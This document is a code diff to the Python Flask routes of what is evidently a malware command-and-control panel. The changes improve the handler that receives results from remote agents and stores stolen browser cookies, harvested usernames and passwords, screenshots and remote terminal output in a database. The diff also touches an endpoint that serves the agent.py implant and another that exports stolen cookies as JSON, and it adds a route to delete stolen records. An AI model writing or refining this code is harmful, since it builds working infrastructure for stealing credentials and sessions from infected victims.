@@ -230,47 +230,75 @@ def init_api_routes(app, socketio):
     def task_result():
         conn = None
         try:
+            # Decrypt and validate incoming data
+            if not request.data:
+                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+                
             data = SecureComms.decrypt(request.data)
-            app.logger.debug(f"Received task result for task ID: {data['task_id']}")
-            
+            if not data or 'task_id' not in data or 'agent_id' not in data:
+                return jsonify({'status': 'error', 'message': 'Invalid task result format'}), 400
+                
+            app.logger.info(f"Processing task result for task ID: {data['task_id']}")
+
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
+            # Update task status
             c.execute('''UPDATE tasks SET status='completed', completed_at=?
                         WHERE id=?''', 
-                    (datetime.now().isoformat(), 
-                    data['task_id']))
+                    (datetime.now().isoformat(), data['task_id']))
             
-            if data['task_type'] == 'steal_cookies' and 'results' in data.get('result', {}):
-                app.logger.info(f"Processing {len(data['result']['results'])} cookie packages")
+            # Handle different task types
+            if data['task_type'] == 'steal_cookies' and 'result' in data and 'results' in data['result']:
+                app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
                 
                 for result in data['result']['results']:
                     try:
-                        if 'zip_content' not in result:
-                            app.logger.error("Missing zip_content in result")
+                        # Validate required fields
+                        if 'browser' not in result:
+                            app.logger.error("Missing browser field in cookie result")
                             continue
                             
-                        zip_content = base64.b64decode(result['zip_content'])
-                        if not zip_content:
-                            app.logger.error("Empty zip content")
+                        if 'zip_content' not in result:
+                            app.logger.error(f"Missing zip_content in {result['browser']} cookie result")
+                            continue
+                            
+                        # Decode and validate cookie data
+                        try:
+                            cookie_data = base64.b64decode(result['zip_content'])
+                            if not cookie_data:
+                                app.logger.error(f"Empty cookie data for {result['browser']}")
+                                continue
+                                
+                            # Verify the data is valid JSON
+                            try:
+                                json.loads(cookie_data.decode('utf-8'))
+                            except ValueError:
+                                app.logger.error(f"Invalid JSON in {result['browser']} cookie data")
+                                continue
+                                
+                        except Exception as e:
+                            app.logger.error(f"Failed to decode {result['browser']} cookie data: {str(e)}")
                             continue
                         
+                        # Store in database
                         c.execute('''INSERT INTO stolen_data 
                                     (agent_id, browser, data_type, content, system_info, timestamp)
                                     VALUES (?, ?, ?, ?, ?, ?)''',
                                 (data['agent_id'],
                                 result['browser'],
                                 'cookies',
-                                sqlite3.Binary(zip_content),
+                                sqlite3.Binary(cookie_data),
                                 json.dumps(result.get('system_info', {})),
                                 datetime.now().isoformat()))
                         
-                        app.logger.info(f"Stored {result['browser']} cookies")
+                        app.logger.info(f"Successfully stored {result['browser']} cookies")
                         
                     except Exception as e:
-                        app.logger.error(f"Failed to store {result['browser']} cookies: {str(e)}")
+                        app.logger.error(f"Failed to process {result.get('browser', 'unknown')} cookies: {str(e)}")
                         continue
             
+            # Handle websocket status updates
             if data['task_type'] == 'websocket':
                 ws_connected = 1 if (data['result'].get('status') == 'success' and 
                                 'connected' in data['result'].get('message', '').lower()) else 0
@@ -284,6 +312,7 @@ def init_api_routes(app, socketio):
                     'message': data['result'].get('message', '')
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
             
+            # Handle terminal output
             if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
                 socketio.emit('terminal_output', {
                     'agent_id': data['agent_id'],
@@ -294,31 +323,37 @@ def init_api_routes(app, socketio):
                     'task_id': data['task_id']
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
 
+            # Handle screenshots
             if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
                 try:
                     image_data = base64.b64decode(data['result']['screenshot'])
                     c.execute('''INSERT INTO screenshots 
                                 VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'], 
-                             image_data,
-                             datetime.now().isoformat()))
+                            image_data,
+                            datetime.now().isoformat()))
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
+            # Handle credential harvesting
             if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
                 for cred in data['result']['credentials']:
                     try:
                         c.execute('''INSERT INTO credentials 
                                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                                (None, data['agent_id'], cred.get('browser', ''), 
-                                 cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
-                                 datetime.now().isoformat()))
+                                (None, data['agent_id'],
+                                cred.get('browser', ''),
+                                cred.get('url', ''),
+                                cred.get('username', ''),
+                                cred.get('password', ''),
+                                datetime.now().isoformat()))
                     except Exception as e:
                         app.logger.error(f"Error storing credential: {str(e)}")
                         pass
             
             conn.commit()
             
+            # Notify clients of task completion
             socketio.emit('task_complete', {
                 'task_id': data['task_id'],
                 'agent_id': data['agent_id'],
@@ -326,7 +361,7 @@ def init_api_routes(app, socketio):
             })
             
             return jsonify({'status': 'success'})
-        
+            
         except Exception as e:
             app.logger.error(f"Task result processing error: {str(e)}")
             if conn:
@@ -355,9 +390,9 @@ def init_api_routes(app, socketio):
         browser, content = data
         return Response(
             content,
-            mimetype='application/zip',
+            mimetype='application/json',
             headers={
-                'Content-Disposition': f'attachment; filename={browser}_cookies.zip'
+                'Content-Disposition': f'attachment; filename={browser}_cookies.json'
             }
         )
 
@@ -418,29 +453,23 @@ def init_api_routes(app, socketio):
             return jsonify({"status": "error", "message": "Agent file not found"}), 404
         return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
 
-    @app.route('/api/debug/cookies')
+    @app.route('/api/stolen_data/<int:data_id>', methods=['DELETE'])
     @login_required
-    def debug_cookies():
-        conn = sqlite3.connect(CONFIG.database)
-        c = conn.cursor()
-        
-        c.execute("SELECT COUNT(*) FROM stolen_data WHERE data_type='cookies'")
-        count = c.fetchone()[0]
-        
-        c.execute('''SELECT id, browser, LENGTH(content), timestamp 
-                     FROM stolen_data 
-                     WHERE data_type='cookies' 
-                     ORDER BY timestamp DESC LIMIT 1''')
-        latest = c.fetchone()
-        
-        conn.close()
-        
-        return jsonify({
-            "cookie_count": count,
-            "latest_entry": {
-                "id": latest[0] if latest else None,
-                "browser": latest[1] if latest else None,
-                "size_bytes": latest[2] if latest else None,
-                "timestamp": latest[3] if latest else None
-            }
-        })
+    def delete_stolen_data(data_id):
+        conn = None
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            c.execute("DELETE FROM stolen_data WHERE id=?", (data_id,))
+            conn.commit()
+            
+            return jsonify({"status": "success"})
+            
+        except Exception as e:
+            if conn:
+                conn.rollback()
+            return jsonify({"status": "error", "message": str(e)}), 500
+        finally:
+            if conn:
+                conn.close()
